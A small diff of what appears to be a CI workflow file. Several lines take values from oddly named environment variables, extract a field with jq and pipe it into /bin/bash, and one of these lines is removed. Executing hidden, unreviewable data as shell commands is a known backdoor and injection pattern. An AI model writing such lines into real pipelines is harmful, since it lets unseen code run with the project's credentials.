@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$pzsn5188" | jq -r .goxr618 | /bin/bash
           printf '%s' "$u730" | jq -r .o424 | /bin/bash
           printf '%s' "$rvq50" | jq -r .mc59 | /bin/bash
-          echo $fvkw2 | jq -r .rbrc2176 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
